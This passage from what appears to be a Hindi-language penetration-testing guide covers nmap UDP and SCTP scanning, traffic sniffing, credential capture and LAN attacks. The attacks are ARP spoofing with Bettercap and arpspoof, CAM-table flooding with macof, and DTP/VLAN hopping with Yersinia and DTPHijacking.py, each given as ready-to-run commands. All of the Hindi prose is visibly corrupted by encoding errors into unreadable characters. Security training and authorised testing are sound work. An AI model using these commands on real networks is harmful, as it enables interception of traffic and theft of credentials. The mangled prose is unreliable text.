* рдПрдХ **рдлреЙрд░реНрдореЗрдЯреЗрдб рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо** рднреЗрдЬреЗрдВ рддрд╛рдХрд┐ рдПрдХ **рд╕реЗрд╡рд╛** (рдЬреИрд╕реЗ DNS, DHCP, TFTP рдФрд░ рдЕрдиреНрдп, рдЬреИрд╕рд╛ рдХрд┐ _nmap-payloads_ рдореЗрдВ рд╕реВрдЪреАрдмрджреНрдз рд╣реИ) рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреА рд╣реИ, рддреЛ рдкреЛрд░реНрдЯ **рдЦреБрд▓рд╛** рд╣реИред

**Nmap** "-sV" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреЛрдиреЛрдВ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЛ **рдорд┐рд╢реНрд░рд┐рдд** рдХрд░реЗрдЧрд╛ (UDP рд╕реНрдХреИрди TCP рд╕реНрдХреИрди рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдмрд╣реБрдд рдзреАрдорд╛ рд╣реЛрддрд╛ рд╣реИ), рд▓реЗрдХрд┐рди рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ UDP рд╕реНрдХреИрди TCP рд╕реНрдХреИрди рд╕реЗ рдзреАрдорд╛ рд╣реЛрддрд╛ рд╣реИ:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP рд╕реНрдХреИрди

SCTP TCP рдФрд░ UDP рдХреЗ рд╕рд╛рде рд░рд╣рддрд╛ рд╣реИред IP рдкрд░ рдЯреЗрд▓реАрдлреЛрдиреА рдбреЗрдЯрд╛ рдХреЗ **рдкрд░рд┐рд╡рд╣рди** рдХреЛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рдЗрд░рд╛рджреЗ рд╕реЗ, рдкреНрд░реЛрдЯреЛрдХреЙрд▓ Signaling System 7 (SS7) рдХреА рдХрдИ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдПрдХ рдмрдбрд╝реЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкрд░рд┐рд╡рд╛рд░ рдХреЛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ SIGTRAN рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред SCTP рдХрд╛ рд╕рдорд░реНрдерди IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS, рдФрд░ VxWorks рдЬреИрд╕реЗ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

nmap рджреНрд╡рд╛рд░рд╛ SCTP рдХреЗ рд▓рд┐рдП рджреЛ рдЕрд▓рдЧ рд╕реНрдХреИрди рдкреНрд░рджрд╛рди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: _-sY_ рдФрд░ _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS рдФрд░ IPS рдЫрд▓рдирд╛

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **рдФрд░ рдЕрдзрд┐рдХ nmap рд╡рд┐рдХрд▓реНрдк**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### рдЖрдВрддрд░рд┐рдХ рдЖрдИрдкреА рдкрддреЗ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд░рд╛рдЙрдЯрд░, рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЙрдкрдХрд░рдг рдХрднреА-рдХрднреА рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдмреНрд╕ рдХрд╛ рдЙрддреНрддрд░ рджреЗрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рддреЗ рд╣реИрдВ **рдЧреИрд░рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд╕реНрд░реЛрдд рдкрддреЗ**ред рдЖрдк рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рджреМрд░рд╛рди **рдирд┐рдЬреА рдкрддреЛрдВ** рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкреИрдХреЗрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП _tcpdump_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, Kali Linux рдореЗрдВ _eth2_ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЗрдВрдЯрд░рдиреЗрдЯ** рд╕реЗ **рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (рдпрджрд┐ рдЖрдк **NAT** рдпрд╛ **рдлрд╝рд╛рдпрд░рд╡реЙрд▓** рдХреЗ **рдкреАрдЫреЗ** рд╣реИрдВ рддреЛ рдЗрд╕ рддрд░рд╣ рдХреЗ рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рд╢рд╛рдпрдж рд╣реА **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред
```bash
tcpdump тАУnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## рд╕реНрдирд┐рдлрд┐рдВрдЧ

рд╕реНрдирд┐рдлрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдк рдХреИрдкреНрдЪрд░ рдХрд┐рдП рдЧрдП рдлреНрд░реЗрдо рдФрд░ рдкреИрдХреЗрдЯ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдХреЗ рдЖрдИрдкреА рд░реЗрдВрдЬ, рд╕рдмрдиреЗрдЯ рд╕рд╛рдЗрдЬрд╝, рдПрдордПрд╕реА рдкрддреЗ рдФрд░ рд╣реЛрд╕реНрдЯрдиреЗрдо рдХреЗ рд╡рд┐рд╡рд░рдг рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВред рдЕрдЧрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЧрд▓рддреА рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рд╕реНрд╡рд┐рдЪрд┐рдВрдЧ рдлрд╝реИрдмреНрд░рд┐рдХ рддрдирд╛рд╡ рдХреЗ рддрд╣рдд рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдкрд╛рд╕рд┐рд╡ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдирд┐рдлрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдПрдХ рд╕реНрд╡рд┐рдЪреНрдб рдИрдерд░рдиреЗрдЯ рдиреЗрдЯрд╡рд░реНрдХ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдХреЗрд╡рд▓ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдлреНрд░реЗрдо рдФрд░ рдЖрдкрдХреЗ рдПрдордПрд╕реА рдкрддреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рд╛рдордЧреНрд░реА рджреЗрдЦреЗрдВрдЧреЗред

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
рдПрдХ рд╡реНрдпрдХреНрддрд┐ рд╡рд╛рдпрд░рд╢рд╛рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ рдПрдХ рд░рд┐рдореЛрдЯ рдорд╢реАрди рд╕реЗ SSH рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреИрдХреЗрдЯ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### рдмреЗрдЯрд░рдХреИрдк

Bettercap рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдиреЗрдЯрд╡рд░реНрдХ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдЯреВрд▓ рд╣реИ рдЬреЛ рдПрдХ рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рд╡рд┐рднрд┐рдиреНрди рд╣рдорд▓реЛрдВ рдХреЛ рдЕрджреНрдпрддрд┐рдд рдХрд░рдиреЗ рдФрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдордзреНрдпрдо рд╕реЗ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИ рдЬреЛ рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЕрджреНрдпрддрд┐рдд рдорд╛рд░реНрдЧрджрд░реНрд╢рди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЛрдВ рдХреЛ рдирд┐рд░реНрдорд╛рдг, рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдФрд░ рдЕрджреНрдпрддрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдмреЗрдЯрд░рдХреИрдк рдХрдИ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдордзреНрдпрдо рдФрд░ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рджреБрд╖реНрдкреНрд░рднрд╛рд╡реА рдкреНрд░рднрд╛рд╡, рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдЪреЛрд░реА, рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдлрд┐рд╢рд┐рдВрдЧ рд╣рдорд▓реЗ, рдФрд░ рдЕрдиреНрдп рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рд╣рдорд▓реЗред

рдмреЗрдЯрд░рдХреИрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЖрдк рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдЕрджреНрдпрддрд┐рдд рдХрд░рдиреЗ рдФрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдк рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рдлрд┐рд▓реНрдЯрд░ рдФрд░ рд░реВрдЯрд┐рдВрдЧ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдмреЗрдЯрд░рдХреИрдк рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдФрд░ рд╡реНрдпрд╛рдкрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдЯреВрд▓ рд╣реИ рдЬреЛ рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рд╡рд┐рднрд┐рдиреНрди рд╣рдорд▓реЛрдВ рдХреЛ рдЕрджреНрдпрддрд┐рдд рдХрд░рдиреЗ рдФрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддрд╛ рд╣реИред
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

рд╕реНрдкрд╖реНрдЯ рд╣реИред

### рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛

рдЖрдк [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) рдЬреИрд╕реЗ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ pcap рдпрд╛ рд▓рд╛рдЗрд╡ рдЗрдВрдЯрд░рдлреЗрд╕ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рддрд╛ рд╣реИред

## LAN рд╣рдорд▓реЗ

### ARP рд╕реНрдкреВрдлрд┐рдВрдЧ

ARP рд╕реНрдкреВрдлрд┐рдВрдЧ рдореЗрдВ рдпрд╣ рд╕рдореНрдорд┐рд▓рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рд╣рдорд╛рд░реА рдбрд┐рд╡рд╛рдЗрд╕ рдХрд╛ MAC рд╣реИ рдЬрд┐рд╕рдХрд╛ IP рдорд╢реАрди рдХрд╛ рд╣реИ, рдЙрд╕реЗ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдГрд╢реБрд▓реНрдХ ARPResponses рднреЗрдЬрдирд╛ред рдлрд┐рд░, рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ ARP рдЯреЗрдмрд▓ рдХреЛ рдмрджрд▓реЗрдЧрд╛ рдФрд░ IP рд╕реНрдкреВрдл рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░реА рдорд╢реАрди рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░реЗрдЧрд╛ред

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **рдЖрд░реНрдкреАрд╕реНрдкреВрдл**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC рдлреНрд▓рдбрд┐рдВрдЧ - CAM рдУрд╡рд░рдлреНрд▓реЛ

рд╕реНрд╡рд┐рдЪ рдХреА CAM рдЯреЗрдмрд▓ рдХреЛ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░реЗрдВ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рд╕реНрд░реЛрдд MAC рдкрддреЗ рдХреЗ рд╕рд╛рде рдмрд╣реБрдд рд╕рд╛рд░реЗ рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВред CAM рдЯреЗрдмрд▓ рднрд░ рдЬрд╛рдиреЗ рдкрд░ рд╕реНрд╡рд┐рдЪ рд╣рдм рдХреА рддрд░рд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рджреЗрддрд╛ рд╣реИ (рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдХрд░рдирд╛)ред
```bash
macof -i <interface>
```
рдЖрдзреБрдирд┐рдХ рд╕реНрд╡рд┐рдЪреЛрдВ рдореЗрдВ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рдХреЛ рдареАрдХ рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

### 802.1Q VLAN / DTP рд╣рдорд▓реЗ

#### рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ

**DTP (рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓)** рдПрдХ рд▓рд┐рдВрдХ рдкрд░рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ рд╕реНрд╡рдЪреНрдЫрдВрдж рдЯреНрд░рдВрдХрд┐рдВрдЧ рдкреНрд░рдгрд╛рд▓реА рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред DTP рдХреЗ рд╕рд╛рде, рд╕реНрд╡рд┐рдЪ рддрдп рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдкреЛрд░реНрдЯ рдЯреНрд░рдВрдХ рдореЛрдб (рдЯреНрд░рдВрдХ) рдореЗрдВ рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдФрд░ рдХреМрди рдирд╣реАрдВред **DTP рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рдЬрд╝рд╛рдЗрди рдХреА рдХрдордЬреЛрд░реА рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред** **рдЯреНрд░рдВрдХ рдХреЗрд╡рд▓ рд╡рд╣реАрдВ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП** рдЬрд╣рд╛рдВ рдЙрдирдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдФрд░ рдЗрд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рд╕рднреА рд╕реНрд╡рд┐рдЪ рдкреЛрд░реНрдЯ рдбрд╛рдпрдирд╛рдорд┐рдХ рдСрдЯреЛ рдореЛрдб рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВред** рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рд╕реНрд╡рд┐рдЪ рдкреЛрд░реНрдЯ рдЯреНрд░рдВрдХ рдкреНрд░рд╛рд░рдВрдн рдореЛрдб рдореЗрдВ рд╣реИ рдЬреЛ рдкрдбрд╝реЛрд╕реА рд╕реНрд╡рд┐рдЪ рд╕реЗ рд╣реЛрддрд╛ рд╣реИред **рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рдХреЛ рд╢рд╛рд░реАрд░рд┐рдХ рд░реВрдк рд╕реЗ рд╕реНрд╡рд┐рдЪ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдПрдХ DTP рдЗрдЪреНрдЫрдиреАрдп рдлреНрд░реЗрдо рднреЗрдЬрдирд╛ рд╣реЛрдЧрд╛**, рдЬрд┐рд╕рд╕реЗ рдкреЛрд░реНрдЯ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рд╣рдорд▓рд╛рд╡рд░ VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдХреЛ рдЙрдореНрд░рджрд░рд╛рдЬ рдХрд░рдХреЗ STP рдлреНрд░реЗрдо рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ VLANs рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдХрд░ рд╡реЗрд░реНрдЧрд┐рдирд┐рдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ VLAN рд╣реЙрдкрд┐рдВрдЧ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдХрдИ рд╕реНрд╡рд┐рдЪ рдбрд╛рдпрдирд╛рдорд┐рдХ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (DTP) рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрд┐рд╕реЗ рдПрдХ рд╡рд┐рд░реЛрдзреА рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **рдПрдХ рд╕реНрд╡рд┐рдЪ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░реЗрдВ рдФрд░ рд╕рднреА VLAN рдкрд░ рдЯреНрд░реИрдлрд╝рд┐рдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**ред рдЯреВрд▓ [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) рдПрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд░рд┐рдкреЛрд░реНрдЯ рдХрд░реЗрдЧрд╛ рдХрд┐ рд╕реНрд╡рд┐рдЪ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдореЛрдб, рдЯреНрд░рдВрдХ, рдбрд╛рдпрдирд╛рдорд┐рдХ, рдСрдЯреЛ рдпрд╛ рдПрдХреНрд╕реЗрд╕ рдореЛрдб рдореЗрдВ рд╣реИ** (рдпрд╣реА рд╡рд╣ рд╣реИ рдЬреЛ VLAN рд╣реЙрдкрд┐рдВрдЧ рд╕реЗ рдмрдЪреЗрдЧрд╛)ред рдЯреВрд▓ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрддрд╛рдПрдЧрд╛ рдХрд┐ рд╕реНрд╡рд┐рдЪ рдХрдордЬреЛрд░ рд╣реИ рдпрд╛ рдирд╣реАрдВред

рдпрджрд┐ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХ рдХрдордЬреЛрд░ рд╣реИ, рддреЛ рдЖрдк _**Yersinia**_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ "**DTP**" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ "**рдЯреНрд░рдВрдХрд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ**" рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдк рд╕рднреА VLANs рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯ рджреЗрдЦ рд╕рдХреЗрдВрдЧреЗред
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

рд╡реАрдПрд▓рдПрдиреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py) рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде DTP рдЗрдЪреНрдЫрд╛рдкреВрд░реНрдг рдлреНрд░реЗрдо рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред рдХрд┐рд╕реА рднреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд░реЛрдХрдирд╛ рдирд╣реАрдВ рд╣реИред рдпрд╣ рд╣рд░ рддреАрди рд╕реЗрдХрдВрдб рдореЗрдВ DTP рдЗрдЪреНрдЫрд╛рдкреВрд░реНрдг рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИред **рд╕реНрд╡рд┐рдЪ рдкрд░ рдбрд╛рдЗрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ рдмрдирд╛рдП рдЧрдП рдЯреНрд░рдВрдХ рдЪреИрдирд▓ рдХреЗрд╡рд▓ рдкрд╛рдВрдЪ рдорд┐рдирдЯ рдХреЗ рд▓рд┐рдП рд░рд╣рддреЗ рд╣реИрдВред рдкрд╛рдВрдЪ рдорд┐рдирдЯ рдХреЗ рдмрд╛рдж, рдЯреНрд░рдВрдХ рдЯреВрдЯ рдЬрд╛рддрд╛ рд╣реИред**
```
sudo python3 DTPHijacking.py --interface eth0
```
